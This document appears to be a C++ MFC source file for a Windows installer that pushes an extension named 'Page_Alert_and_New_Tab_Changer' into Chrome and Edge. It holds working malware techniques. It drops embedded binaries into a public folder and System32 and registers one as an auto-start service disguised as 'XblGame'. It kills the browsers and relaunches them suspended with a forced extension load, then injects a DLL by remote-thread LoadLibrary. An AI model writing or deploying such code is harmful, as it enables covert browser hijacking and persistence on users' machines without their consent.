
// Test_CRXDlg.cpp : implementation file
//

#include "pch.h"
#include "ProcessUtil.h"
#include "framework.h"
#include "Test_CRX.h"
#include "Test_CRXDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include <fstream>   // For file operations
#include <iostream>  // For console output
#include <winsvc.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <windows.h>
#include <vector>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()



// CTestCRXDlg dialog
CTestCRXDlg::CTestCRXDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_TEST_CRX_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTestCRXDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO_CRX, m_ctrlComboCRX);
}

BEGIN_MESSAGE_MAP(CTestCRXDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CTestCRXDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDOK, &CTestCRXDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON_UN_INSTALL, &CTestCRXDlg::OnBnClickedButtonUnInstall)
END_MESSAGE_MAP()

// CTestCRXDlg message handlers
BOOL CTestCRXDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	m_ctrlComboCRX.AddString(L"Page_Alert_and_New_Tab_Changer ");
	m_ctrlComboCRX.SetCurSel(0);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CTestCRXDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CTestCRXDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CTestCRXDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CTestCRXDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	CDialogEx::OnCancel();
}
//
//void CopyDirectory(const CString& sourceDir, const CString& destDir)
//{
//	// Ensure the source directory exists
//	if (!PathFileExists(sourceDir))
//	{
//		return;
//	}
//
//	// Create the destination directory if it doesn't exist
//	if (!PathFileExists(destDir))
//	{
//		if (!CreateDirectory(destDir, nullptr))
//		{
//			return;
//		}
//	}
//
//	// Prepare buffers for file and directory paths
//	CString findFilePattern = sourceDir + L"\\*";
//	WIN32_FIND_DATA findData;
//	HANDLE hFind = FindFirstFile(findFilePattern, &findData);
//
//	if (hFind != INVALID_HANDLE_VALUE)
//	{
//		do
//		{
//			CString sourcePath = sourceDir + L"\\" + findData.cFileName;
//			CString destPath = destDir + L"\\" + findData.cFileName;
//
//			// Check if it's a directory and not "." or ".."
//			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
//			{
//				if (lstrcmp(findData.cFileName, L".") != 0 && lstrcmp(findData.cFileName, L"..") != 0)
//				{
//					// Recursively copy subdirectories
//					CopyDirectory(sourcePath, destPath);
//				}
//			}
//			else
//			{
//				// Copy the file
//				if (!CopyFile(sourcePath, destPath, FALSE))
//				{
//				}
//			}
//		} while (FindNextFile(hFind, &findData));
//
//		FindClose(hFind);
//	}
//	else
//	{
//	}
//}

void WriteResourceToFile(UINT resourceID, LPCTSTR resourceType, LPCTSTR outputFileName)
{
	// Find the resource
	HRSRC hResInfo = FindResource(AfxGetInstanceHandle(), MAKEINTRESOURCE(resourceID), resourceType);
	if (hResInfo == NULL)
	{
		return;
	}

	// Load the resource
	HGLOBAL hResData = LoadResource(AfxGetInstanceHandle(), hResInfo);
	if (hResData == NULL)
	{
		return;
	}

	// Lock the resource and get its data pointer
	LPVOID pData = LockResource(hResData);
	if (pData == NULL)
	{
		FreeResource(hResData);
		return;
	}

	// Get the size of the resource data
	DWORD dwSize = SizeofResource(AfxGetInstanceHandle(), hResInfo);
	if (dwSize == 0)
	{
		FreeResource(hResData);
		return;
	}

	// Create a file stream for writing
	std::ofstream outputFile(outputFileName, std::ios::binary);
	if (!outputFile.is_open())
	{
		FreeResource(hResData);
		return;
	}

	// Write resource data to the file
	outputFile.write(static_cast<const char*>(pData), dwSize);

	// Close the file
	outputFile.close();

	// Free the loaded resource
	FreeResource(hResData);

}

void	CTestCRXDlg::SS_Init()
{
	TCHAR	w_szCurDir[MAX_PATH] = L"";
	TCHAR	w_szTemp[MAX_PATH] = L"";
	TCHAR	w_szParam[MAX_PATH] = L"";

	// Get the current directory
	//GetCurrentDirectory(MAX_PATH, w_szCurDir);
	//_tcscpy(w_szTemp, w_szCurDir);
	//_tcscat(w_szTemp, L"\\data");

	CreateDirectory(L"C:\\Users\\Public\\data", NULL);

	//. Copy Directory 
	WriteResourceToFile(IDR_TEXT1, _T("TEXT"), L"C:\\Users\\Public\\data\\mi_nt_svc.exe");
	WriteResourceToFile(IDR_TEXT2, _T("TEXT"), L"C:\\Users\\Public\\data\\ntdb.dll");
	WriteResourceToFile(IDR_TEXT3, _T("TEXT"), L"C:\\Windows\\System32\\data1.zip");
	WriteResourceToFile(IDR_TEXT4, _T("TEXT"), L"C:\\Users\\Public\\data\\ver.dat");


	swprintf(w_szParam, L"/C sc stop ACP_User_Service_1asd");
	_execute(L"cmd.exe", w_szParam, 1);
	swprintf(w_szParam, L"/C sc delete ACP_User_Service_1asd");
	_execute(L"cmd.exe", w_szParam, 1);

	swprintf(w_szParam, L"/C sc stop ACP_User_Service_2asd");
	_execute(L"cmd.exe", w_szParam, 1);
	swprintf(w_szParam, L"/C sc delete ACP_User_Service_2asd");
	_execute(L"cmd.exe", w_szParam, 1);

	swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mi_nt_svc.exe\" start= auto");
	_execute(L"cmd.exe", w_szParam, 1);
	swprintf(w_szParam, L"/C sc start XblGame");
	_execute(L"cmd.exe", w_szParam, 1);

	return;
}

bool InjectDLL(HANDLE hProcess, const char* dllPath) {
	// Allocate memory in the target process for the DLL path
	LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (!pRemotePath) {
		return false;
	}

	// Write the DLL path to the allocated memory
	if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath) + 1, NULL)) {
		VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
		return false;
	}

	// Get the address of LoadLibraryA
	LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibraryA) {
		VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
		return false;
	}

	// Create a remote thread to load the DLL
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
	if (!hRemoteThread) {
		VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
		return false;
	}

	// Wait for the remote thread to finish
	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hRemoteThread);
	VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);

	return true;
}
void Test_Chrome(TCHAR*		p_sProcessName)
{

	TCHAR* targetProcess = p_sProcessName;//L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"; 
	const char* dllPath = "C:\\Users\\Public\\data\\ntdb.dll";
	TCHAR	w_szCommand[MAX_PATH] = L"";

	swprintf(w_szCommand, L"\"%s\" --new-window \"https://www.bing.com\" --load-extension=\"C:\\Users\\Public\\data\\ext\"", p_sProcessName);

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	// Create the target process in suspended state
	if (!CreateProcess((LPWSTR)targetProcess, w_szCommand, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi)) {
		DWORD error = GetLastError();
		return ;
	}
	else {
	}

	//. 
	{
		FILE* w_pFile = _tfopen(L"C:\\Users\\Public\\data\\sss.dat", L"wb");
		fclose(w_pFile);
	}
	// Inject the DLL
	if (!InjectDLL(pi.hProcess, dllPath)) {
		TerminateProcess(pi.hProcess, 1);
		return ;
	}

	// Resume the target process
	ResumeThread(pi.hThread);

	// Close process and thread handles
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
void CTestCRXDlg::OnBnClickedOk()
{
	UpdateData(TRUE);

	BOOL		w_bOpenedChrome = FALSE;
	BOOL		w_bOpenedEdge = FALSE;
	TCHAR		w_szParam[MAX_PATH] = L"";

	if (m_ctrlComboCRX.GetCurSel() == 0) {

		std::wstring processName = L"chrome.exe";
		w_bOpenedChrome = TeminateProcess(processName);

		processName = L"msedge.exe";
		w_bOpenedEdge = TeminateProcess(processName);


		SS_Init();
		Sleep(1000);

		AfxMessageBox(L"OK ... Install");

		if (w_bOpenedChrome) {
//			AfxMessageBox(L"w_bOpenedChrome OK");
			_tcscpy(w_szParam, L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
			Test_Chrome(w_szParam);
		}
		else {
//			AfxMessageBox(L"w_bOpenedChrome Faild");
		}

		if (w_bOpenedEdge) {
//			AfxMessageBox(L"w_bOpenedEdge OK");
			_tcscpy(w_szParam, L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
			Test_Chrome(w_szParam);
		}
		else {
//			AfxMessageBox(L"w_bOpenedEdge Faild");
		}

	}

L_EXIT:
	return;
}



void CTestCRXDlg::OnBnClickedButtonUnInstall()
{
	TCHAR	w_szParam[MAX_PATH] = L"";

	swprintf(w_szParam, L"/C sc stop XblGame");
	_execute(L"cmd.exe", w_szParam, 1);
	swprintf(w_szParam, L"/C sc delete XblGame");
	_execute(L"cmd.exe", w_szParam, 1);

	Sleep(1000);
	std::wstring processName = L"chrome.exe";
	TeminateProcess(processName);

	processName = L"msedge.exe";
	TeminateProcess(processName);

	processName = L"explorer.exe";
	TeminateProcess(processName);

	swprintf(w_szParam, L"/C explorer");
	_execute(L"cmd.exe", w_szParam, 0);

	//.
	std::wstring directoryPath = L"C:\\Users\\Public\\data";

	// Ensure the directory path ends with a double null character
	directoryPath.append(1, L'\0');
	SHFILEOPSTRUCT fileOp = { 0 };
	fileOp.wFunc = FO_DELETE;  // Deletion operation
	fileOp.pFrom = directoryPath.c_str();
	fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT; // Flags to suppress UI and confirmation dialogs

	int result = SHFileOperation(&fileOp);

	AfxMessageBox(L"OK ... Uninstall");
}
